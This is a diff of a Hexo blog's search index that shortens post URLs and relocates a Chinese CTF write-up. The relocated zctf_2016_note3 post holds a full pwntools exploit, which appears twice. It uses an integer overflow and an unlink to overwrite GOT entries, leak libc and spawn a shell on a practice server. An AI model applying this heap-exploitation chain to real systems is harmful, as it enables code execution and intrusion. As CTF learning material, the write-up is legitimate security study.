@@ -2,7 +2,7 @@
 <search>
   <entry>
     <title>2021长安杯-pwn</title>
-    <url>/greedgod/2021/09/25/2021%E9%95%BF%E5%AE%89%E6%9D%AF-pwn/</url>
+    <url>/2021/09/25/2021%E9%95%BF%E5%AE%89%E6%9D%AF-pwn/</url>
     <content><![CDATA[<p>高质量比赛，下辈子再来（</p>
 <span id="more"></span>
 
@@ -20,7 +20,7 @@
   </entry>
   <entry>
     <title>HRP-转生web人</title>
-    <url>/greedgod/2021/09/27/HRP-%E8%BD%AC%E7%94%9Fweb%E4%BA%BA/</url>
+    <url>/2021/09/27/HRP-%E8%BD%AC%E7%94%9Fweb%E4%BA%BA/</url>
     <content><![CDATA[<p>和人合资买了SHOW的vip，pwn好卷，于是打算双开了（也许三开？偶尔逆向）</p>
 <span id="more"></span>
 
@@ -73,7 +73,7 @@
   </entry>
   <entry>
     <title>Hello World</title>
-    <url>/greedgod/2021/09/14/hello-world/</url>
+    <url>/2021/09/14/hello-world/</url>
     <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
 <span id="more"></span>
 
@@ -93,7 +93,7 @@
   </entry>
   <entry>
     <title>how2heap</title>
-    <url>/greedgod/2021/08/29/how2heap/</url>
+    <url>/2021/08/29/how2heap/</url>
     <content><![CDATA[<p>HWO 2 HEAP</p>
 <span id="more"></span>
 
@@ -133,7 +133,7 @@
   </entry>
   <entry>
     <title>天翼杯</title>
-    <url>/greedgod/2021/09/28/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
+    <url>/2021/09/28/%E5%A4%A9%E7%BF%BC%E6%9D%AF/</url>
     <content><![CDATA[<p>我是废物！！！！（超大声）</p>
 <span id="more"></span>
 
@@ -151,8 +151,20 @@
 ]]></content>
   </entry>
   <entry>
+    <title>整数溢出unlink</title>
+    <url>/2021/09/14/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BAunlink/</url>
+    <content><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><p>整数溢出的unlink，在edit功能里面造成了整数溢出</p>
+<p>，这个题目的排布也很神奇，原本在heap[-1]处就存在一个堆指针。。。。</p>
+<p>所以溢出成-1大小是无限的</p>
+<span id="more"></span>
+
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#r = process(&#x27;./zctf_2016_note3&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26250</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./zctf_2016_note3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_0_ptr_addr = <span class="number">0x00000000006020C8</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;(less than 1024)&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;content:&#x27;</span>,content[<span class="number">0</span>:size-<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#让heaps[-1]为heaps[0]</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在，通过让index为-1，就可以溢出chunk0</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">payload += p64(heap_0_ptr_addr - <span class="number">0x18</span>) + p64(heap_0_ptr_addr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">0x8000000000000000</span> - <span class="number">0x10000000000000000</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) * <span class="number">3</span> + p64(free_got) + p64(atoi_got) *<span class="number">2</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露atoi地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改atoi的got表为system地址</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+  </entry>
+  <entry>
     <title>堆学习_remake</title>
-    <url>/greedgod/2021/10/05/%E5%A0%86%E5%AD%A6%E4%B9%A0-remake/</url>
+    <url>/2021/10/05/%E5%A0%86%E5%AD%A6%E4%B9%A0-remake/</url>
     <content><![CDATA[<p>记录内容借鉴来源<a href="https://www.yuque.com/cyberangel/rg9gdm/vsh3kd">https://www.yuque.com/cyberangel/rg9gdm/vsh3kd</a></p>
 <span id="more"></span>
 
@@ -246,20 +258,8 @@
 ]]></content>
   </entry>
   <entry>
-    <title>整数溢出unlink</title>
-    <url>/greedgod/2021/09/14/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BAunlink/</url>
-    <content><![CDATA[<h1 id="zctf-2016-note3"><a href="#zctf-2016-note3" class="headerlink" title="zctf_2016_note3"></a>zctf_2016_note3</h1><p>整数溢出的unlink，在edit功能里面造成了整数溢出</p>
-<p>，这个题目的排布也很神奇，原本在heap[-1]处就存在一个堆指针。。。。</p>
-<p>所以溢出成-1大小是无限的</p>
-<span id="more"></span>
-
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#r = process(&#x27;./zctf_2016_note3&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26250</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./zctf_2016_note3&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">heap_0_ptr_addr = <span class="number">0x00000000006020C8</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;(less than 1024)&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;content:&#x27;</span>,content[<span class="number">0</span>:size-<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,content</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">   r.sendafter(<span class="string">&#x27;Input the new content:&#x27;</span>,content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">   r.sendlineafter(<span class="string">&#x27;Input the id of the note:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"><span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#6</span></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"><span class="comment">#让heaps[-1]为heaps[0]</span></span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#现在，通过让index为-1，就可以溢出chunk0</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">payload += p64(heap_0_ptr_addr - <span class="number">0x18</span>) + p64(heap_0_ptr_addr - <span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x100</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">0x8000000000000000</span> - <span class="number">0x10000000000000000</span>,payload)</span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>) * <span class="number">3</span> + p64(free_got) + p64(atoi_got) *<span class="number">2</span> + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#修改free的got表为puts的plt表</span></span><br><span class="line">edit(<span class="number">0</span>,p64(puts_plt)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#泄露atoi地址</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;libc_base=&#x27;</span>,<span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;system_addr=&#x27;</span>,<span class="built_in">hex</span>(system_addr)</span><br><span class="line"><span class="comment">#修改atoi的got表为system地址</span></span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr)[<span class="number">0</span>:<span class="number">7</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">r.sendlineafter(<span class="string">&#x27;option---&gt;&gt;&#x27;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
     <title>绿城杯pwn1-3</title>
-    <url>/greedgod/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AFpwn1-3/</url>
+    <url>/2021/09/30/%E7%BB%BF%E5%9F%8E%E6%9D%AFpwn1-3/</url>
     <content><![CDATA[<p>=-=，不想评价这次的绿城，打过的话懂得都懂yue</p>
 <span id="more"></span>
 
@@ -288,7 +288,7 @@
   </entry>
   <entry>
     <title>记一次自己出的REPWN</title>
-    <url>/greedgod/2021/09/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84REPWN/</url>
+    <url>/2021/09/17/%E8%AE%B0%E4%B8%80%E6%AC%A1%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84REPWN/</url>
     <content><![CDATA[<p>自己最近在学逆向，想着把re和pwn结合，结果因为pwn的问题反而困扰了自己很久，好在最后搞定了。</p>
 <span id="more"></span>
 
@@ -309,7 +309,7 @@
   </entry>
   <entry>
     <title>逆向学习记录</title>
-    <url>/greedgod/2021/09/15/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
+    <url>/2021/09/15/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
     <content><![CDATA[<p>RE</p>
 <span id="more"></span>
 
@@ -563,7 +563,7 @@
   </entry>
   <entry>
     <title>长城杯pwn1</title>
-    <url>/greedgod/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AFpwn1/</url>
+    <url>/2021/09/20/%E9%95%BF%E5%9F%8E%E6%9D%AFpwn1/</url>
     <content><![CDATA[<p>题目存在off by one 以及UAF漏洞</p>
 <p>我们可以利用爆破</p>
 <p>低字节修改到malloc-0x23</p>
